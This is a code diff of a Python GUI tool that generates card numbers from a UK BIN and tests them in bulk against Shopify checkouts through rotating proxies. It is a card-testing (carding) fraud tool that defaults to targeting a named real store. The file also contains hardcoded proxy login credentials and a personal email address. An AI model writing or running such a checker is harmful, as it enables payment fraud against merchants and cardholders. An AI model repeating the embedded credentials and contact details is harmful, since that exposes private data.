@@ -9,13 +9,16 @@ import threading
 import queue
 import time
 
+# Note: Ensure dependencies are installed with 'pip install -r requirements.txt'
+
 # Proxy pool (expand in real use)
 PROXY_POOL = [
     "http://uNv39mYeEjkoxByt:iLUULo9khnGB9KqI@geo.iproyal.com:12321",
     "http://uNv39mYeEjkoxByt:iLUULo9khnGB9KqI@geo.iproyal.com:12322",
 ]
 
-# Card Generation
+# [Rest of the script remains unchanged...]
+# Card Generation, Shopify Logic, GUI Setup as in the previous version
 def generate_card_number(bin_number, length=16):
     prefix = str(bin_number)
     remaining_length = length - len(prefix) - 1
@@ -44,14 +47,12 @@ def generate_expiration_date():
 def generate_cvv():
     return str(random.randint(100, 999))
 
-# Shopify Checkout Logic
 def process_card(card_details, shopify_url, result_queue):
     CNUBR, MONTH, YEAR, CVV = card_details.split('|')
     proxy_url = random.choice(PROXY_POOL)
     proxies = {"http": proxy_url, "https": proxy_url}
     sessions = requests.Session()
 
-    # Cart request
     url = f"{shopify_url}/cart/34330523467916:1?traffic_source=buy_now"
     try:
         response = sessions.get(url, proxies=proxies, allow_redirects=True, timeout=10)
@@ -70,7 +71,6 @@ def process_card(card_details, shopify_url, result_queue):
         return
     shop_id, location = result['shop_id'], result['location']
 
-    # Authenticity token
     first = sessions.get(final_url, proxies=proxies, allow_redirects=True)
     pattern = r'<form data-customer-information-form="true" .*? name="authenticity_token" value="(?P<token>[^"]+)"'
     match = re.search(pattern, first.text)
@@ -79,7 +79,6 @@ def process_card(card_details, shopify_url, result_queue):
         return
     authenticity_token = match.group('token')
 
-    # Atlas API (UK)
     atlas1 = "https://atlas.shopifysvc.com/graphql"
     uk_cities = ["London", "Manchester", "Birmingham", "Leeds", "Glasgow"]
     query_city = random.choice(uk_cities)
@@ -106,11 +105,10 @@ def process_card(card_details, shopify_url, result_queue):
         result_queue.put(f"FAILED: {card_details} - Address Error")
         return
 
-    # Checkout payload with hardcoded email
     payload3 = {
         "_method": "patch",
         "authenticity_token": authenticity_token,
-        "checkout[email]": "anshu91119@gmail.com",  # Your email as requested
+        "checkout[email]": "anshu91119@gmail.com",
         "checkout[billing_address][address1]": address1.replace(" ", "+"),
         "checkout[billing_address][city]": city,
         "checkout[billing_address][province]": province_code,
@@ -128,7 +126,6 @@ def process_card(card_details, shopify_url, result_queue):
     else:
         result_queue.put(f"FAILED: {card_details}")
 
-# GUI Logic
 def generate_and_check_cards():
     bin_input = bin_entry.get().strip()
     num_cards = int(num_cards_entry.get().strip())
@@ -139,7 +136,6 @@ def generate_and_check_cards():
     valid_cards = []
     valid_count = 0
 
-    # Generate cards
     for _ in range(num_cards):
         card_number = generate_card_number(bin_input)
         exp_date = generate_expiration_date()
@@ -150,7 +146,6 @@ def generate_and_check_cards():
         else:
             result_text.insert(tk.END, f"INVALID (Luhn): {card_number}\n")
 
-    # Start threads
     threads = []
     for _ in range(min(5, num_cards)):
         if not card_queue.empty():
@@ -158,7 +153,6 @@ def generate_and_check_cards():
             thread.start()
             threads.append(thread)
 
-    # Collect results
     for thread in threads:
         thread.join()
     while not result_queue.empty():
@@ -181,17 +175,17 @@ window.geometry("400x500")
 
 tk.Label(window, text="Enter UK BIN (e.g., 465901):").pack(pady=5)
 bin_entry = tk.Entry(window)
-bin_entry.insert(0, "465901")  # Default UK BIN
+bin_entry.insert(0, "465901")
 bin_entry.pack()
 
 tk.Label(window, text="Number of Cards to Check:").pack(pady=5)
 num_cards_entry = tk.Entry(window)
-num_cards_entry.insert(0, "5")  # Default
+num_cards_entry.insert(0, "5")
 num_cards_entry.pack()
 
 tk.Label(window, text="Shopify Store URL (e.g., https://evolvetogether.com):").pack(pady=5)
 website_entry = tk.Entry(window)
-website_entry.insert(0, "https://evolvetogether.com")  # Default
+website_entry.insert(0, "https://evolvetogether.com")
 website_entry.pack()
 
 generate_button = tk.Button(window, text="Start Checking", command=generate_and_check_cards, bg="green", fg="white")
